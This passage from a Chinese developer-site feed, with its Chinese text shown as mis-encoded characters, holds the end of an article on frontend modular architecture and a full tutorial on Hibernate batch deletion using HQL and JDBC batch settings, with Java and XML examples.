<li><strong>UI æ˜¯ä¸ç¨³å®šçš„</strong>ï¼šäº§å“ç»ç†ä»Šå¤©è¦æŠŠæŒ‰é’®æ”¾å·¦è¾¹ï¼Œæ˜å¤©è¦æ”¾å³è¾¹ï¼Œåå¤©è¦æ¢ä¸ªé¢œè‰²ã€‚</li>
<li><strong>ä¸šåŠ¡é€»è¾‘æ˜¯ç›¸å¯¹ç¨³å®šçš„</strong>ï¼šæ–‡æ¡£çš„ä¿å­˜ã€ååŒç®—æ³•ã€æƒé™æ ¡éªŒï¼Œè¿™äº›æ ¸å¿ƒé€»è¾‘ä¸ä¼šè½»æ˜“å˜ã€‚</li>
<li><strong>åŸºç¡€åº“æ˜¯æœ€ç¨³å®šçš„</strong>ï¼šReact æ¡†æ¶ã€Lodash å·¥å…·å‡½æ•°ã€‚</li>
</ul>
<p><strong>æ¨¡å—åŒ–åˆ‡åˆ†ç­–ç•¥ï¼š</strong> ç»ä¸è¦æŠŠæ ¸å¿ƒä¸šåŠ¡é€»è¾‘å†™åœ¨ UI ç»„ä»¶é‡Œï¼ˆVue çš„ <code>script</code> æˆ– React çš„ <code>useEffect</code>ï¼‰ã€‚ <strong>Headlessï¼ˆæ— å¤´åŒ–ï¼‰</strong> æ˜¯å‰ç«¯æ¶æ„çš„å¿…ç„¶è¶‹åŠ¿ã€‚ä½ åº”è¯¥æŠŠé€»è¾‘æŠ½ç¦»æˆçº¯ JS/TS æ¨¡å—ï¼ˆHook æˆ– Classï¼‰ï¼ŒUI åªæ˜¯ä¸€ä¸ªåªæœ‰ <code>render</code> å‡½æ•°çš„ç¬¨è›‹å£³å­ã€‚è¿™æ ·ï¼Œå½“ UI ç¿»å¤©è¦†åœ°å˜åŒ–æ—¶ï¼Œä½ çš„æ ¸å¿ƒé€»è¾‘æ¨¡å—å¯ä»¥çº¹ä¸ä¸åŠ¨ã€‚</p>
<h3 data-id="heading-8">3.2 å¾ªç¯ä¾èµ–æ˜¯æ¶æ„çš„ç™Œç»†èƒ</h3>
<p>å¦‚æœ A æ¨¡å—å¼•ç”¨äº† Bï¼ŒB åˆå¼•ç”¨äº† Aï¼Œè¿™åœ¨æ–‡ä»¶å±‚é¢å¯èƒ½é€šè¿‡ Webpack è§£å†³äº†ï¼Œä½†åœ¨é€»è¾‘å±‚é¢ï¼Œè¿™æ„å‘³ç€ A å’Œ B é”æ­»åœ¨äº†ä¸€èµ·ï¼Œæ— æ³•å•ç‹¬æµ‹è¯•ï¼Œæ— æ³•å•ç‹¬å¤ç”¨ã€‚</p>
<p><strong>å¦‚ä½•æ‰“ç ´å¾ªç¯ï¼Ÿ</strong></p>
<ol>
<li><strong>ä¸‹æ²‰æ³•ï¼š</strong> æ‰¾åˆ° A å’Œ B å…±åŒä¾èµ–çš„éƒ¨åˆ†ï¼ŒæŠ½å–æˆ C æ¨¡å—ï¼ŒA å’Œ B éƒ½ä¾èµ– Cã€‚</li>
<li><strong>åè½¬æ³•ï¼ˆä¾èµ–å€’ç½® DIPï¼‰ï¼š</strong> A ä¸ç›´æ¥ä¾èµ– Bï¼ŒA å®šä¹‰ä¸€ä¸ªæ¥å£ï¼ˆInterfaceï¼‰ï¼ŒB å»å®ç°è¿™ä¸ªæ¥å£ã€‚A åªä¾èµ–æ¥å£ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-9">å››ã€ æ¨¡å—åŒ–çš„ä»£ä»·ï¼šè¿‡åº¦è®¾è®¡çš„é™·é˜±</h2>
<p>æœ€åï¼Œå¿…é¡»ç»™æ¶æ„å¸ˆä»¬æ³¼ä¸€ç›†å†·æ°´ã€‚æ¨¡å—åŒ–æ˜¯æœ‰æˆæœ¬çš„ã€‚</p>
<p><strong>æ¨¡å—åŒ– = å¢åŠ é—´æ¥å±‚ã€‚</strong></p>
<p>å¦‚æœä½ æŠŠä¸€ä¸ªç®€å•çš„â€œHello Worldâ€æ‹†æˆäº† Providerã€Serviceã€Componentã€Type å››ä¸ªæ–‡ä»¶ï¼Œé‚£ä½ ä¸æ˜¯åœ¨åšæ¶æ„ï¼Œä½ æ˜¯åœ¨<strong>åˆ¶é€ å™ªéŸ³</strong>ã€‚</p>
<p><strong>æ¶æ„å¸ˆçš„åˆ¤æ–­åŠ›ä½“ç°åœ¨ï¼š</strong></p>
<ul>
<li><strong>è¯†åˆ«å˜åŒ–ç‚¹ï¼š</strong> åªæœ‰é‚£äº›<strong>æœªæ¥ææœ‰å¯èƒ½å‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ–è€…<strong>å¤æ‚åº¦æé«˜</strong>çš„åœ°æ–¹ï¼Œæ‰å€¼å¾—è¢«å°è£…æˆç‹¬ç«‹æ¨¡å—ã€‚</li>
<li><strong>é€‚åº¦å†—ä½™ï¼ˆDRY vs WETï¼‰ï¼š</strong> æœ‰æ—¶å€™ï¼Œå¤åˆ¶ç²˜è´´ä»£ç æ¯”é”™è¯¯çš„æŠ½è±¡æ›´å¥½ã€‚å¦‚æœä½ å¼ºè¡ŒæŠŠä¸¤ä¸ªçœ‹ä¼¼ç›¸ä¼¼ä½†ä¸šåŠ¡èƒŒæ™¯å®Œå…¨ä¸åŒçš„é€»è¾‘åˆå¹¶æˆä¸€ä¸ªæ¨¡å—ï¼Œæœªæ¥å½“å®ƒä»¬å‘ä¸åŒæ–¹å‘æ¼”è¿›æ—¶ï¼Œä½ å°†é™·å…¥æ— å°½çš„ <code>if (isModeA) else (isModeB)</code> çš„åœ°ç‹±ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-10">ç»“è¯­ï¼šä»â€œå†™ä»£ç â€åˆ°â€œè®¾è®¡ç³»ç»Ÿâ€</h2>
<p>æ¨¡å—åŒ–ä¸æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œè€Œæ˜¯ä¸€ç§<strong>ä¸–ç•Œè§‚</strong>ã€‚</p>
<p>å½“ä½ å¼€å§‹æ€è€ƒ**â€œå¦‚æœæˆ‘åˆ æ‰è¿™è¡Œä»£ç ï¼Œå½±å“çš„èŒƒå›´æ˜¯å¤šå¤§â€ <strong>ï¼Œæˆ–è€…</strong>â€œå¦‚æœæˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶å¤¹ç§»èµ°ï¼Œå…¶ä»–éƒ¨åˆ†è¿˜èƒ½ä¸èƒ½è·‘â€**çš„æ—¶å€™ï¼Œä½ å°±å·²ç»è·¨è¶Šäº†â€œæ–‡ä»¶æ‹†åˆ†â€çš„è¾¹ç•Œï¼Œå¼€å§‹ç”¨æ¶æ„å¸ˆçš„çœ¼å…‰å®¡è§†ä½ çš„ç³»ç»Ÿäº†ã€‚</p>
<p>è¿™åªæ˜¯æ€æƒ³çš„å¼€ç¯‡ã€‚æœ‰äº†è¿™ä¸ªæ€ç»´åŸºçŸ³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†æ·±å…¥éª¨æ¶ï¼Œæ¢è®¨å¦‚ä½•åœ¨å…·ä½“çš„ UI å±‚é¢å®ç°<strong>æè‡´çš„é€»è¾‘ä¸è§†å›¾åˆ†ç¦»</strong>ã€‚</p>
<blockquote>
<p><strong>Next Step:</strong> æ€æƒ³å·²ç»å»ºç«‹ï¼Œä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†è¿›å…¥å®æˆ˜æ·±æ°´åŒºã€‚å¦‚ä½•è®¾è®¡ä¸€ä¸ªæ—¢èƒ½å¤ç”¨ï¼Œåˆèƒ½çµæ´»å®šåˆ¶ UI çš„ç»„ä»¶ï¼Ÿ è¯·çœ‹**ã€Šç¬¬äºŒç¯‡ï¼šéª¨æ¶ï¼ˆä¸Šï¼‰â€”â€”ç»„ä»¶åŒ–æ·±åº¦è®¾è®¡ï¼šé€»è¾‘ä¸è§†å›¾çš„æè‡´åˆ†ç¦»ï¼ˆHeadless UIï¼‰ã€‹**ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597452210646810624</link>    <guid>https://juejin.cn/post/7597452210646810624</guid>    <pubDate>2026-01-21T11:55:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646810624" data-draft-id="7597635202324824116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:55:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:55:28.000Z" title="Wed Jan 21 2026 11:55:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateæä¾›äº†å‡ ç§æ–¹å¼æ¥å®ç°æ‰¹é‡åˆ é™¤æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬ä½¿ç”¨HQLï¼ˆHibernate Query Languageï¼‰å’Œæ‰¹é‡æ“ä½œè®¾ç½®æ¥è¿›è¡Œä¼˜åŒ–ã€‚è¯¦ç»†è§£é‡Šå¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-0">1. ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</h3>
<p>é€šè¿‡HQLå¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡åˆ é™¤æ“ä½œï¼Œé¿å…é€æ¡åˆ é™¤å®ä½“ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†å®ç°å’Œä»£ç ç¤ºä¾‹ï¼š</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        deleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"delete from Product where price &gt; :price"</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">deletedEntities</span> <span class="hljs-operator">=</span> session.createQuery(hql)
                                         .setParameter(<span class="hljs-string">"price"</span>, price)
                                         .executeUpdate();
            transaction.commit();
            System.out.println(<span class="hljs-string">"Number of products deleted: "</span> + deletedEntities);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®è¿›è¡Œä¼˜åŒ–</h3>
<p>Hibernateå…è®¸é€šè¿‡æ‰¹é‡æ“ä½œè®¾ç½®æ¥ä¼˜åŒ–æ‰¹é‡åˆ é™¤çš„æ€§èƒ½ã€‚åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®æ‰¹é‡æ“ä½œå±æ€§ï¼š</p>
<h4 data-id="heading-5">é…ç½®æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- other configurations --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.jdbc.batch_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_inserts"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_updates"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">æ‰¹é‡åˆ é™¤ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchDeleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDeleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            List&lt;Product&gt; products = session.createQuery(<span class="hljs-string">"from Product where price &gt; :price"</span>, Product.class)
                                            .setParameter(<span class="hljs-string">"price"</span>, price)
                                            .list();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Product product : products) {
                session.delete(product);

                <span class="hljs-comment">// æ¯æ‰¹æ¬¡20ä¸ªè¿›è¡Œä¸€æ¬¡æ‰¹å¤„ç†</span>
                <span class="hljs-keyword">if</span> (++count % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products deleted successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-7">æ€»ç»“</h3>
<ol>
<li><strong>ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</strong>ï¼šé€šè¿‡HQLè¯­å¥å¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡åˆ é™¤æ“ä½œï¼Œé¿å…é€æ¡åˆ é™¤å®ä½“ã€‚</li>
<li><strong>é…ç½®Hibernateæ‰¹é‡æ“ä½œè®¾ç½®</strong>ï¼šé€šè¿‡åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®<code>hibernate.jdbc.batch_size</code>ç­‰å±æ€§ï¼Œå¯ä»¥ä¼˜åŒ–æ‰¹é‡åˆ é™¤çš„æ€§èƒ½ã€‚</li>
<li><strong>æ‰¹é‡åˆ é™¤ç¤ºä¾‹</strong>ï¼šé€šè¿‡ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®å’Œå®šæœŸåˆ·æ–°æ¸…ç†ä¼šè¯ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†å¤§æ‰¹é‡çš„æ•°æ®åˆ é™¤ã€‚</li>
</ol>
